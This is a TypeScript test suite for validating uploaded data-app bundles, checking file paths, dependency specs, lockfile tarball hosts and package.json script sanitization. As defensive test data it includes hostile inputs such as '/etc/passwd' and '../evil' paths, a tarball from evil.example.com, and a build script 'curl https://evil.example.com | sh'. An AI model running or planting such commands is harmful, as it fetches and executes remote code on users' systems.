import {
    computeCustomDependencies,
    currentDataAppCodeVersion,
    extractLockfilePackages,
    MAX_DECLARED_DEPENDENCIES,
    MAX_LOCKFILE_BYTES,
    parseLockfilePackageKey,
    sanitizeAppPackageJsonScripts,
    validateDataAppCode,
    validateDataAppDependencies,
    type DataAppCode,
    type DataAppCodeDownload,
    type DataAppDependencies,
} from './code';

const valid: DataAppCode = {
    manifest: {
        codeVersion: currentDataAppCodeVersion,
        appUuid: 'app-1',
        projectUuid: 'proj-1',
        version: 3,
        name: 'My App',
        description: '',
        template: null,
        downloadedAt: '2026-06-30T00:00:00.000Z',
    },
    files: [{ path: 'index.html', contentBase64: 'PGh0bWw+' }],
};

describe('validateDataAppCode', () => {
    it('returns the bundle when shape is valid', () => {
        expect(validateDataAppCode(valid)).toEqual(valid);
    });
    it('throws when files is missing', () => {
        expect(() =>
            validateDataAppCode({ manifest: valid.manifest }),
        ).toThrow();
    });
    it('throws when a file path escapes the bundle root', () => {
        expect(() =>
            validateDataAppCode({
                manifest: valid.manifest,
                files: [{ path: '../evil', contentBase64: '' }],
            }),
        ).toThrow();
    });
    it('throws when a file path is absolute (leading slash)', () => {
        expect(() =>
            validateDataAppCode({
                manifest: valid.manifest,
                files: [{ path: '/etc/passwd', contentBase64: '' }],
            }),
        ).toThrow();
    });
    it.each(['.', './index.html', 'src/.', 'src//index.html', 'src/'])(
        'throws when a file path has an unsafe segment (%s)',
        (badPath) => {
            expect(() =>
                validateDataAppCode({
                    manifest: valid.manifest,
                    files: [{ path: badPath, contentBase64: '' }],
                }),
            ).toThrow();
        },
    );
    it('accepts a dotfile as a valid path', () => {
        const withDotfile: DataAppCode = {
            manifest: valid.manifest,
            files: [{ path: '.gitignore', contentBase64: '' }],
        };
        expect(validateDataAppCode(withDotfile)).toEqual(withDotfile);
    });
    it('throws on non-object inputs', () => {
        expect(() => validateDataAppCode(null)).toThrow();
        expect(() => validateDataAppCode('not-a-bundle')).toThrow();
    });
    it('throws when a file entry is null', () => {
        expect(() =>
            validateDataAppCode({
                manifest: valid.manifest,
                files: [null],
            }),
        ).toThrow('Invalid app bundle: file entry is not an object');
    });
    it('throws when a file entry is a string', () => {
        expect(() =>
            validateDataAppCode({
                manifest: valid.manifest,
                files: ['not-an-object'],
            }),
        ).toThrow('Invalid app bundle: file entry is not an object');
    });
    it('accepts a manifest with scaffoldingVersion', () => {
        const withVersion: DataAppCode = {
            ...valid,
            manifest: { ...valid.manifest, scaffoldingVersion: '0.3275.0' },
        };
        expect(validateDataAppCode(withVersion)).toEqual(withVersion);
    });
});

// ─── validateDataAppDependencies ────────────────────────────────────────────

const TEMPLATE_DEPS: Record<string, string> = {
    react: '19.2.5',
    'react-dom': '19.2.5',
    '@lightdash/query-sdk': '0.3303.0',
};

const makeDeps = (
    overrides?: Partial<DataAppDependencies>,
): DataAppDependencies => ({
    packageJson: JSON.stringify({
        dependencies: { react: '19.2.5', 'react-dom': '19.2.5' },
    }),
    lockfile: 'lockfileVersion: 9.0\nreact@19.2.5:\n  react-dom@19.2.5:\n',
    ...overrides,
});

// Lockfile-free custom-set computation: used by the CLI on upload when the
// folder has the scaffold package.json but no pnpm-lock.yaml.
describe('computeCustomDependencies', () => {
    it('returns an empty set when declared deps match the template baseline', () => {
        const packageJson = JSON.stringify({
            dependencies: { react: '19.2.5', 'react-dom': '19.2.5' },
        });
        expect(computeCustomDependencies(packageJson, TEMPLATE_DEPS)).toEqual(
            {},
        );
    });

    it('returns new packages and version overrides', () => {
        const packageJson = JSON.stringify({
            dependencies: { react: '18.3.1', 'my-chart-lib': '^3.0.0' },
        });
        expect(computeCustomDependencies(packageJson, TEMPLATE_DEPS)).toEqual({
            react: '18.3.1',
            'my-chart-lib': '^3.0.0',
        });
    });

    it('throws on a non-registry spec', () => {
        const packageJson = JSON.stringify({
            dependencies: { evil: 'github:attacker/evil' },
        });
        expect(() =>
            computeCustomDependencies(packageJson, TEMPLATE_DEPS),
        ).toThrow(/not a registry semver spec/);
    });

    it('throws when packageJson has no dependencies object', () => {
        const packageJson = JSON.stringify({ name: 'app' });
        expect(() =>
            computeCustomDependencies(packageJson, TEMPLATE_DEPS),
        ).toThrow(/"dependencies" object/);
    });
});

describe('validateDataAppDependencies', () => {
    it('returns empty customDeps when all declared deps match the template', () => {
        const result = validateDataAppDependencies(makeDeps(), {
            templateDependencies: TEMPLATE_DEPS,
        });
        expect(result.customDeps).toEqual({});
    });

    it('flags a new package not in the template as custom', () => {
        const deps = makeDeps({
            packageJson: JSON.stringify({
                dependencies: { 'my-chart-lib': '^3.0.0' },
            }),
            lockfile: 'lockfileVersion: 9.0\nmy-chart-lib@3.2.0:\n',
        });
        const result = validateDataAppDependencies(deps, {
            templateDependencies: TEMPLATE_DEPS,
        });
        expect(result.customDeps).toEqual({ 'my-chart-lib': '^3.0.0' });
    });

    it('flags a version override as custom', () => {
        const deps = makeDeps({
            packageJson: JSON.stringify({
                dependencies: { react: '18.3.1' }, // template has 19.2.5
            }),
            lockfile: 'lockfileVersion: 9.0\nreact@18.3.1:\n',
        });
        const result = validateDataAppDependencies(deps, {
            templateDependencies: TEMPLATE_DEPS,
        });
        expect(result.customDeps).toEqual({ react: '18.3.1' });
    });

    it('does not count devDependencies in the declared set', () => {
        const deps = makeDeps({
            packageJson: JSON.stringify({
                dependencies: { react: '19.2.5' },
                devDependencies: { typescript: '6.0.0' },
            }),
            lockfile: 'lockfileVersion: 9.0\nreact@19.2.5:\n',
        });
        const result = validateDataAppDependencies(deps, {
            templateDependencies: TEMPLATE_DEPS,
        });
        expect(result.customDeps).toEqual({});
    });

    it('throws when packageJson is not valid JSON', () => {
        expect(() =>
            validateDataAppDependencies(makeDeps({ packageJson: 'not-json' }), {
                templateDependencies: TEMPLATE_DEPS,
            }),
        ).toThrow(/not valid JSON/i);
    });

    it('throws when packageJson has no "dependencies" key', () => {
        expect(() =>
            validateDataAppDependencies(
                makeDeps({ packageJson: JSON.stringify({ name: 'app' }) }),
                { templateDependencies: TEMPLATE_DEPS },
            ),
        ).toThrow(/"dependencies"/);
    });

    it('throws when a spec uses git+ protocol', () => {
        expect(() =>
            validateDataAppDependencies(
                makeDeps({
                    packageJson: JSON.stringify({
                        dependencies: {
                            foo: 'git+https://github.com/foo/foo.git',
                        },
                    }),
                    lockfile: 'lockfileVersion: 9.0\nfoo:\n',
                }),
                { templateDependencies: {} },
            ),
        ).toThrow(/registry semver spec/i);
    });

    it('throws when a spec uses file: protocol', () => {
        expect(() =>
            validateDataAppDependencies(
                makeDeps({
                    packageJson: JSON.stringify({
                        dependencies: { bar: 'file:../bar' },
                    }),
                    lockfile: 'lockfileVersion: 9.0\nbar:\n',
                }),
                { templateDependencies: {} },
            ),
        ).toThrow(/registry semver spec/i);
    });

    it('throws when a spec uses workspace: protocol', () => {
        expect(() =>
            validateDataAppDependencies(
                makeDeps({
                    packageJson: JSON.stringify({
                        dependencies: { sdk: 'workspace:*' },
                    }),
                    lockfile: 'lockfileVersion: 9.0\nsdk:\n',
                }),
                { templateDependencies: {} },
            ),
        ).toThrow(/registry semver spec/i);
    });

    it('throws when a spec uses https: tarball URL', () => {
        expect(() =>
            validateDataAppDependencies(
                makeDeps({
                    packageJson: JSON.stringify({
                        dependencies: { baz: 'https://example.com/baz.tgz' },
                    }),
                    lockfile: 'lockfileVersion: 9.0\nbaz:\n',
                }),
                { templateDependencies: {} },
            ),
        ).toThrow(/registry semver spec/i);
    });

    it('throws when a spec uses github: shorthand', () => {
        expect(() =>
            validateDataAppDependencies(
                makeDeps({
                    packageJson: JSON.stringify({
                        dependencies: { foo: 'github:user/repo' },
                    }),
                    lockfile: 'lockfileVersion: 9.0\nfoo:\n',
                }),
                { templateDependencies: {} },
            ),
        ).toThrow(/registry semver spec/i);
    });

    it('allows npm: aliases pointing at semver specs', () => {
        const deps = makeDeps({
            packageJson: JSON.stringify({
                dependencies: { preact: 'npm:preact@^10.0.0' },
            }),
            lockfile: 'lockfileVersion: 9.0\npreact@10.0.0:\n',
        });
        const result = validateDataAppDependencies(deps, {
            templateDependencies: {},
        });
        expect(result.customDeps).toEqual({ preact: 'npm:preact@^10.0.0' });
    });

    it('rejects npm: aliases pointing at git+ specs', () => {
        expect(() =>
            validateDataAppDependencies(
                makeDeps({
                    packageJson: JSON.stringify({
                        dependencies: {
                            foo: 'npm:bar@git+https://github.com/bar/bar.git',
                        },
                    }),
                    lockfile: 'lockfileVersion: 9.0\nfoo:\n',
                }),
                { templateDependencies: {} },
            ),
        ).toThrow(/registry semver spec/i);
    });

    it.each([
        ['gitlab: shorthand', 'gitlab:user/repo'],
        ['bitbucket: shorthand', 'bitbucket:user/repo'],
        ['gist: shorthand', 'gist:abc123'],
        ['bare relative path', '../../x'],
        ['bare local path', './vendor/foo'],
        ['dist-tag', 'latest'],
        ['npm: alias without a version', 'npm:preact'],
    ])('rejects %s specs', (_label, spec) => {
        expect(() =>
            validateDataAppDependencies(
                makeDeps({
                    packageJson: JSON.stringify({
                        dependencies: { foo: spec },
                    }),
                    lockfile: 'lockfileVersion: 9.0\nfoo:\n',
                }),
                { templateDependencies: {} },
            ),
        ).toThrow(/registry semver spec/i);
    });

    it.each([
        ['exact', '1.2.3'],
        ['caret', '^1.2.3'],
        ['tilde', '~1.2.0'],
        ['comparator range', '>=1.2.0 <2.0.0'],
        ['x-range', '1.2.x'],
        ['star', '*'],
        ['hyphen range', '1.0.0 - 2.0.0'],
        ['union', '^1.0.0 || ^2.0.0'],
        ['prerelease', '9.0.0-beta.1'],
    ])('accepts %s semver specs', (_label, spec) => {
        const result = validateDataAppDependencies(
            makeDeps({
                packageJson: JSON.stringify({ dependencies: { foo: spec } }),
                lockfile: 'lockfileVersion: 9.0\nfoo:\n',
            }),
            { templateDependencies: {} },
        );
        expect(result.customDeps).toEqual({ foo: spec });
    });

    it('rejects lockfiles resolving tarballs from non-allowed hosts', () => {
        expect(() =>
            validateDataAppDependencies(
                makeDeps({
                    lockfile:
                        'lockfileVersion: 9.0\nreact@19.2.5:\n  resolution:\n    tarball: https://evil.example.com/react.tgz\n',
                }),
                {
                    templateDependencies: TEMPLATE_DEPS,
                    allowedTarballHosts: ['registry.npmjs.org'],
                },
            ),
        ).toThrow(/not an allowed registry host/i);
    });

    it('accepts lockfiles whose tarballs point at allowed hosts', () => {
        const result = validateDataAppDependencies(
            makeDeps({
                lockfile:
                    'lockfileVersion: 9.0\nreact@19.2.5:\n  resolution:\n    tarball: https://registry.npmjs.org/react/-/react-19.2.5.tgz\nreact-dom@19.2.5:\n',
            }),
            {
                templateDependencies: TEMPLATE_DEPS,
                allowedTarballHosts: ['registry.npmjs.org'],
            },
        );
        expect(result.customDeps).toEqual({});
    });

    it('skips tarball host validation when allowedTarballHosts is not provided', () => {
        const result = validateDataAppDependencies(
            makeDeps({
                lockfile:
                    'lockfileVersion: 9.0\nreact@19.2.5:\n  resolution:\n    tarball: https://evil.example.com/react.tgz\nreact-dom@19.2.5:\n',
            }),
            { templateDependencies: TEMPLATE_DEPS },
        );
        expect(result.customDeps).toEqual({});
    });
    it(`throws when declared dep count exceeds MAX_DECLARED_DEPENDENCIES (${MAX_DECLARED_DEPENDENCIES})`, () => {
        const tooMany = Object.fromEntries(
            Array.from({ length: MAX_DECLARED_DEPENDENCIES + 1 }, (_, i) => [
                `pkg-${i}`,
                `^${i}.0.0`,
            ]),
        );
        const lockfileContent = `lockfileVersion: 9.0\n${Object.keys(tooMany)
            .map((n) => `${n}:\n`)
            .join('')}`;
        expect(() =>
            validateDataAppDependencies(
                makeDeps({
                    packageJson: JSON.stringify({ dependencies: tooMany }),
                    lockfile: lockfileContent,
                }),
                { templateDependencies: {} },
            ),
        ).toThrow(/exceeds maximum/i);
    });

    it('throws when lockfile exceeds MAX_LOCKFILE_BYTES', () => {
        const bigLockfile = 'x'.repeat(MAX_LOCKFILE_BYTES + 1);
        expect(() =>
            validateDataAppDependencies(makeDeps({ lockfile: bigLockfile }), {
                templateDependencies: TEMPLATE_DEPS,
            }),
        ).toThrow(/lockfile exceeds/i);
    });

    it('throws when the lockfile is not valid YAML', () => {
        expect(() =>
            validateDataAppDependencies(
                makeDeps({ lockfile: '{{{{not yaml: [' }),
                { templateDependencies: TEMPLATE_DEPS },
            ),
        ).toThrow(/not valid YAML/i);
    });

    it('throws when the lockfile lacks lockfileVersion', () => {
        expect(() =>
            validateDataAppDependencies(
                makeDeps({ lockfile: 'react@19.2.5:\n  react-dom@19.2.5:\n' }),
                { templateDependencies: TEMPLATE_DEPS },
            ),
        ).toThrow(/missing lockfileVersion/i);
    });

    it('throws when a custom package is missing from the lockfile', () => {
        const deps = makeDeps({
            packageJson: JSON.stringify({
                dependencies: { 'missing-pkg': '^1.0.0' },
            }),
            lockfile: 'lockfileVersion: 9.0\nsome-other-pkg@1.0.0:\n', // missing-pkg not mentioned
        });
        expect(() =>
            validateDataAppDependencies(deps, { templateDependencies: {} }),
        ).toThrow(/not found in pnpm-lock\.yaml/i);
    });

    it('throws when packageJson is empty string', () => {
        expect(() =>
            validateDataAppDependencies(makeDeps({ packageJson: '' }), {
                templateDependencies: {},
            }),
        ).toThrow(/non-empty string/i);
    });

    it('throws when lockfile is empty string', () => {
        expect(() =>
            validateDataAppDependencies(makeDeps({ lockfile: '' }), {
                templateDependencies: {},
            }),
        ).toThrow(/non-empty string/i);
    });

    it('throws on non-object input', () => {
        expect(() =>
            validateDataAppDependencies('not-object', {
                templateDependencies: {},
            }),
        ).toThrow(/not an object/i);
    });
});

describe('sanitizeAppPackageJsonScripts', () => {
    const templateScripts = { dev: 'vite', build: 'vite build' };

    it('replaces uploader scripts with the template scripts', () => {
        const input = JSON.stringify({
            name: 'app',
            scripts: { build: 'curl https://evil.example.com | sh' },
            dependencies: { react: '19.2.5' },
        });
        const parsed = JSON.parse(
            sanitizeAppPackageJsonScripts(input, templateScripts),
        );
        expect(parsed.scripts).toEqual(templateScripts);
        expect(parsed.dependencies).toEqual({ react: '19.2.5' });
    });

    it('adds template scripts when the upload has none', () => {
        const input = JSON.stringify({ dependencies: {} });
        const parsed = JSON.parse(
            sanitizeAppPackageJsonScripts(input, templateScripts),
        );
        expect(parsed.scripts).toEqual(templateScripts);
    });

    it('returns the input unchanged when it is not valid JSON', () => {
        expect(sanitizeAppPackageJsonScripts('not-json', templateScripts)).toBe(
            'not-json',
        );
    });
});

describe('parseLockfilePackageKey', () => {
    it.each([
        [
            'canvas-confetti@1.9.4',
            { name: 'canvas-confetti', version: '1.9.4' },
        ],
        ['@scope/pkg@1.2.3', { name: '@scope/pkg', version: '1.2.3' }],
        [
            'react-dom@19.0.0(react@19.0.0)',
            { name: 'react-dom', version: '19.0.0' },
        ],
        [
            '@scope/pkg@1.2.3(peer@2.0.0)',
            { name: '@scope/pkg', version: '1.2.3' },
        ],
    ])('parses %s', (key, expected) => {
        expect(parseLockfilePackageKey(key)).toEqual(expected);
    });

    it.each(['@scope-only', 'no-version', 'foo@link:../foo'])(
        'returns null for non-registry key %s',
        (key) => {
            expect(parseLockfilePackageKey(key)).toBeNull();
        },
    );
});

describe('extractLockfilePackages', () => {
    it('returns every resolved package from the packages section, de-duped', () => {
        const lockfile = [
            "lockfileVersion: '9.0'",
            'packages:',
            '  canvas-confetti@1.9.4:',
            '    resolution: {integrity: sha512-aaa}',
            '  react@19.0.0:',
            '    resolution: {integrity: sha512-bbb}',
            '  react@19.0.0(react-dom@19.0.0):',
            '    resolution: {integrity: sha512-bbb}',
            "  '@scope/pkg@2.1.0':",
            '    resolution: {integrity: sha512-ccc}',
            '',
        ].join('\n');
        expect(extractLockfilePackages(lockfile)).toEqual([
            { name: 'canvas-confetti', version: '1.9.4' },
            { name: 'react', version: '19.0.0' },
            { name: '@scope/pkg', version: '2.1.0' },
        ]);
    });

    it('returns [] for unparseable or package-less lockfiles', () => {
        expect(extractLockfilePackages('{{ not yaml')).toEqual([]);
        expect(extractLockfilePackages("lockfileVersion: '9.0'\n")).toEqual([]);
    });
});

describe('validateDataAppCode with dependencies', () => {
    it('accepts a bundle with no dependencies field (backward compat)', () => {
        expect(validateDataAppCode(valid)).toEqual(valid);
    });

    it('accepts a bundle with valid dependencies when no template is provided', () => {
        const withDeps: DataAppCode = {
            ...valid,
            dependencies: makeDeps(),
        };
        expect(validateDataAppCode(withDeps)).toEqual(withDeps);
    });

    it('throws when dependencies.packageJson is not a string', () => {
        expect(() =>
            validateDataAppCode({
                ...valid,
                dependencies: {
                    packageJson: 42,
                    lockfile: 'lockfileVersion: 9.0\nok',
                },
            }),
        ).toThrow(/dependencies\.packageJson/);
    });

    it('throws when dependencies.lockfile is not a string', () => {
        expect(() =>
            validateDataAppCode({
                ...valid,
                dependencies: { packageJson: '{}', lockfile: null },
            }),
        ).toThrow(/dependencies\.lockfile/);
    });

    it('runs full validation when templateDependencies is provided', () => {
        expect(() =>
            validateDataAppCode(
                {
                    ...valid,
                    dependencies: makeDeps({
                        packageJson: JSON.stringify({
                            dependencies: { foo: 'file:../foo' },
                        }),
                        lockfile: 'lockfileVersion: 9.0\nfoo:\n',
                    }),
                },
                { templateDependencies: {} },
            ),
        ).toThrow(/registry semver spec/i);
    });

    it('skips full validation when templateDependencies is omitted', () => {
        // Even an invalid spec won't throw if no template is supplied — the
        // structural check passes, full validation is deferred to the caller.
        expect(() =>
            validateDataAppCode({
                ...valid,
                dependencies: makeDeps({
                    packageJson: JSON.stringify({ dependencies: {} }),
                }),
            }),
        ).not.toThrow();
    });
});

it('DataAppCodeDownload carries manifest, files, and context', () => {
    const dl: DataAppCodeDownload = {
        ...valid,
        context: {
            semanticLayer: {
                path: '.lightdash/context/semantic-layer.yml',
                contentBase64: '',
            },
            parameters: null,
            promptHistory: {
                path: '.lightdash/context/prompt-history.md',
                contentBase64: '',
            },
            theme: { instructions: null, assets: [], skippedAssetCount: 0 },
        },
    };
    expect(dl.context.theme.skippedAssetCount).toBe(0);
});
